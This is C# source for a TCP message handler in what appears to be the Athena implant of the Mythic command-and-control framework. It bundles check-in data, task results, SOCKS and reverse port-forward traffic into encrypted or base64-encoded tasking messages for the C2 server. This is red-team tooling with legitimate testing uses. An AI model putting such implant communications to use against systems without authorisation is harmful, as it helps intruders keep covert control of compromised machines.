using Athena.Commands;
using Athena.Models.Commands;
using Athena.Models.Comms.SMB;
using Athena.Models.Mythic.Tasks;
using Athena.Models.Proxy;
using Athena.Utilities;
using System.Collections.Concurrent;
using System.Text.Json;

namespace Athena.Profiles.Forwarders.Models
{
    class TcpMessageHandler : ITcpMessenger
    {
        public event EventHandler<MessageReceivedArgs> MessageReceived;
        private ConcurrentBag<string> messages = new ConcurrentBag<string>();
        private bool encrypted { get; set; }
        public PSKCrypto crypt { get; set; }
        public TcpMessageHandler(ConcurrentBag<string> messages, bool encrypted, PSKCrypto crypt)
        {
            this.crypt = crypt;
            this.encrypted = encrypted;
            this.messages = messages;
        }
        public TcpMessageHandler(ConcurrentBag<string> messages)
        {
            crypt = null;
            encrypted = false;
            this.messages = messages;
        }
        public bool ForwardMessage(string msg)
        {
            MessageReceivedArgs mra = new MessageReceivedArgs(msg);

            MessageReceived.Invoke(this, mra);
            return true;
        }
        public async Task<string> GetMessage()
        {
            Task<List<string>> responseTask = TaskResponseHandler.GetTaskResponsesAsync();
            Task<List<DelegateMessage>> delegateTask = DelegateResponseHandler.GetDelegateMessagesAsync();
            Task<List<MythicDatagram>> socksTask = ProxyResponseHandler.GetSocksMessagesAsync();
            Task<List<MythicDatagram>> rpFwdTask = ProxyResponseHandler.GetRportFwdMessagesAsync();
            await Task.WhenAll(responseTask, delegateTask, socksTask, rpFwdTask);
            List<string> responses = responseTask.Result;
            List<DelegateMessage> delegateMessages = delegateTask.Result;
            List<MythicDatagram> socksMessages = socksTask.Result;
            List<MythicDatagram> rpfwdMessages = rpFwdTask.Result;

            if (messages.Count > 0) //Checkin Message
            {
                string res = messages.Take(1).First();

                if (encrypted)
                {
                    res = crypt.Encrypt(res);
                }
                else
                {
                    res = await Misc.Base64Encode(res);
                }

                return res;
            }

            if (responses.Count > 0 || delegateMessages.Count > 0 || socksMessages.Count > 0)
            {
                GetTasking gt = new GetTasking()
                {
                    action = "get_tasking",
                    tasking_size = -1,
                    delegates = delegateMessages,
                    socks = socksMessages,
                    responses = responses,
                    rpfwd = rpfwdMessages,
                };

                string res = JsonSerializer.Serialize(gt, GetTaskingJsonContext.Default.GetTasking);

                if (encrypted)
                {
                    res = crypt.Encrypt(res);
                }
                else
                {
                    res = await Misc.Base64Encode(res);
                }

                return res;
            }

            return string.Empty;
        }
    }
}
